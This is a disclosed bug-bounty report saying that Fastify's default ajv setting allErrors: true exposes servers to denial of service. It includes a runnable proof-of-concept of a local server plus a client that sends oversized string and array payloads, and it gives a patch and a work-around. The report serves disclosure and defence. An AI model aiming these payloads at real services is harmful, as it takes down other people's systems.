# Fastify uses allErrors: true ajv configuration by default which is susceptible to DoS

## Report Details
- **Report ID**: 903521
- **URL**: https://hackerone.com/reports/903521
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-06-20T04:51:56.346Z
- **Disclosed**: 2020-07-29T12:53:44.132Z

## Reporter
- **Username**: chalker
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report a denial of service vulnerability in fastify
It allows to cause a DoS with some schemas that were otherwise assumed to be secure against DoS by their authors

# Module

**module name:** fastify
**version:** `2.14.1`, `3.0.0-rc.4`
**npm page:** `https://www.npmjs.com/package/fastify`

## Module Description

> An efficient server implies a lower cost of the infrastructure, a better responsiveness under load and happy users. 

## Module Stats

114 076 weekly downloads

# Vulnerability

## Vulnerability Description

See <https://github.com/ajv-validator/ajv#security-risks-of-trusted-schemas>:

> **Please note:** The suggestions above to prevent slow validation would only work if you do NOT use `allErrors: true` in production code (using it would continue validation after validation errors).

`fastify` uses `allErrors: true` by default which makes it susceptible to DoS attacks even when schemas are otherwise safe.

E.g. a (sub-)schema `{ uniqueItems: true, maxItems: 10 }` is otherwise safe against DoS as `maxItems` is checked **first** and validation fails there on long arrays, _but that applies to only not in `allErrors: true` case_. 

Neither https://github.com/fastify/fastify/blob/master/docs/Validation-and-Serialization.md nor https://github.com/fastify/fastify/blob/master/docs/Recommendations.md mentions this directly.

Introduced in https://github.com/fastify/fastify/pull/1398

## Steps To Reproduce:

```js
/* Client */

const fetch = require('node-fetch')
const request = body => {
  const json = JSON.stringify(body)
  console.log(`Payload size: ${Math.round(json.length / 1024)} KiB`)
  return fetch('http://127.0.0.1:3000/', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: json
  })
}

const fireRequests = async () => {
  await request({ string: '@'.repeat(90000) })
  await request({ array: Array(20000).fill().map(() => ({x: Math.random().toString(32).slice(2)})) })
}

/* Server */

const fastify = require('fastify')({ logger: true })

const schema = {
  body: {
    type: 'object',
    properties: {
      array: { uniqueItems: true, maxItems: 10 },
      string: { pattern: "^[^/]+@.+#$", maxLength: 20 },
    }
  },
}

fastify.post('/', { schema }, (request, reply) => {
  reply.send({ hello: 'world', body: request.body })
})

fastify.listen(3000, (err, address) => {
  fastify.log.info(`server listening on ${address}`)
  fireRequests()
})
```

https://gist.github.com/ChALkeR/15e758d3fc5cbba0840b6a03a070c838

## Patch

Revert https://github.com/fastify/fastify/pull/1398

## Work-around

Use https://github.com/fastify/fastify/blob/master/docs/Server.md#ajv to override `allErrors` to `false` in ajv configuration.

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

Cause DoS in a presence of potentially slow pattern / format or `uniqueItems` in the schema, even when schema author guarded that with a length check to be otherwise immune to DoS.

## Attachments
No attachments
